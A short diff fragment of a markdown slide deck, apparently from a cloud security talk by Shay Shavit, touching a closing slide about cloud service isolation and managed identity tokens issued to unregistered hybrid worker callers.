+**Cloud isolation is only as strong as the assumptions between services.**
 
 ## Slide 50
 
@@ -935,4 +869,3 @@ MI tokens issued to callers not registered as a hybrid worker for that account.
 
 ###### Shay Shavit
 
-50
